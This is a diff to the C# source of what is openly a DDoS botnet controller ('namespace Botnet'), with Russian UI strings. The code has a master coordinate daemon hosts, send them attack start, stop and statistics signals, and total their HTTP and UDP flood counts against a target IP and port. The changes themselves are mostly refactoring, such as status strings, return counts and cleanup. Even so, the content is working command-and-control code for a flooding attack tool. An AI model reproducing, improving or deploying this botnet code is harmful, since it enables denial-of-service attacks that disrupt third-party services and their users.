@@ -49,6 +49,7 @@ namespace Botnet
                 try
                 {
                     IPEndPoint point = (IPEndPoint)(Client.Client.RemoteEndPoint);
+                   
                     return point.Address + " " + point.Port;
                 }
                 catch (ObjectDisposedException)
@@ -56,6 +57,17 @@ namespace Botnet
 
                     return "Object Disposed";
                 }
+            }
+            public string ToStringLong()
+            {
+                string status = "";
+                switch (state)
+                {
+                    case ControllerState.Attacking: status = "Атака"; break;
+                    case ControllerState.Suspending: status = "Ожидание"; break;
+                    default: status = "Ошибка"; break;
+                }
+                return ToString() + " " + status;
             }
         }
         /// <summary>
@@ -231,7 +243,7 @@ namespace Botnet
             TcpClient Connection = Params as TcpClient;
             string key = ((IPEndPoint)(Connection.Client.RemoteEndPoint)).ToString();
             string hostname = Daemons[key].ToString();
-            UpdateData(hostname + " Присоединился");   ///index!!!
+            UpdateData(hostname + " Присоединился");
             NetworkStream Stream = Connection.GetStream();
             Connection.ReceiveBufferSize = 1000;
             Connection.ReceiveTimeout = 200;
@@ -258,7 +270,6 @@ namespace Botnet
                                         UInt32 Http = BitConverter.ToUInt32(buffer, 0);
                                         UInt32 Udp = BitConverter.ToUInt32(buffer, 4);
                                         Daemons.addStat(key, Http, Udp);
-                                        ProccessStatisticRespond(Core.HttpCounter, Core.UdpCounter, Core.HttpCounter + Daemons.getTotalHttp(), Core.UdpCounter + Daemons.getTotalUdp());
                                     }
                                 }
                                 break;
@@ -359,7 +370,7 @@ namespace Botnet
                 HostClient.Close();
 
             }
-            catch (SocketException err)
+            catch (SocketException)
             {
                 UpdateData("Невозможно подключиться к мастеру"); //1060 exception
                 state = ControllerState.Error;
@@ -413,7 +424,7 @@ namespace Botnet
         /// </summary>
         private void SendStopSignal()
         {
-            foreach (Daemon host in Daemons.Values) //need to lock this
+            foreach (Daemon host in Daemons.Values) //need to lock this perhaps?
             {
                 if (host.state == ControllerState.Attacking)
                 {
@@ -423,17 +434,20 @@ namespace Botnet
             }
         }
         /// <summary>
-        /// Отправляет хостам, выполняющим атаку, запрос статистических данных
+        /// Отправляет хостам, выполняющим атаку, запрос статистических данных. Возвращает количество отправленных сообщений
         /// </summary>
-        private void SendStatReqSignal()
+        private int SendStatReqSignal()
         {
+            int am = 0;
             foreach (Daemon host in Daemons.Values) //need to lock this
             {
                 if (host.state == ControllerState.Attacking)
                 {
                     SendServiceMessage(MessageCode.StatisticMessageRequest, host.Client);
+                    am++;
                 }
             }
+            return am;
         }
         private void CoreErrorHandler(int errorcode, string message)  //0 socket error, 1 - cant reach the target
         {
@@ -444,7 +458,6 @@ namespace Botnet
             ExErrorHandler(message);
         }
         public delegate void CallBackFunct(string Message);
-        public delegate void ChangeModeCallBack(bool mode); //looks like its not needed
         public delegate void StatisticCallBack(UInt32 httpam, UInt32 udpam, UInt32 tothttp, UInt32 totudp);
         public delegate void ErrorCallBack(string message);
         public enum ControllerState : Byte
@@ -468,6 +481,9 @@ namespace Botnet
         /// Определяет текущий порт
         /// </summary>
         public int CurrentPort { get; set; }
+        /// <summary>
+        /// Определяет локальную сетевую точку
+        /// </summary>
         public IPEndPoint LocalIpEndPoint
         {
             get
@@ -475,6 +491,9 @@ namespace Botnet
                 return MyPoint;
             }
         }
+        /// <summary>
+        /// В режиме хоста, определяет сетевую точку, определяющую мастера атаки
+        /// </summary>
         public IPEndPoint MasterIpEndPont
         {
             get
@@ -524,7 +543,7 @@ namespace Botnet
                 InitInterface(Adapter, alt_port, MasterPoint);
                 InitParams(Params);
             }
-            catch (Exception err)
+            catch (Exception)
             {
                 state = ControllerState.Error;
             }
@@ -644,7 +663,7 @@ namespace Botnet
                         if (AttackIsAllowed)
                         {
                             Core.start();
-                            UpdateData("Начало атаки на" + Core.Params.Target.Address.ToString() + ":" + Core.Params.Target.Port);
+                            UpdateData("Начало атаки на " + Core.Params.Target.Address.ToString() + ":" + Core.Params.Target.Port);
                             state = ControllerState.Attacking;
                         }
                         else UpdateData("Атака еще не запущена мастером");
@@ -704,10 +723,8 @@ namespace Botnet
                 {
                     SendStatReqSignal();
                 }
-                else
-                {
-                    ProccessStatisticRespond(Core.HttpCounter, Core.UdpCounter, Core.HttpCounter, Core.UdpCounter);
-                }
+                ProccessStatisticRespond(Core.HttpCounter, Core.UdpCounter, Core.HttpCounter + Daemons.getTotalHttp(), Core.UdpCounter + Daemons.getTotalUdp());
+
             }
             else
             {
@@ -725,7 +742,7 @@ namespace Botnet
             int i = 0;
             foreach (Daemon host in Daemons.Values)
             {
-                info[i] = host.ToString();
+                info[i] = host.ToStringLong();
                 ++i;
             }
             return info;
@@ -763,6 +780,7 @@ namespace Botnet
                     HostClient.Close();
                 }
             }
+            if (Core != null) Core.Close();
         }
     }
 }
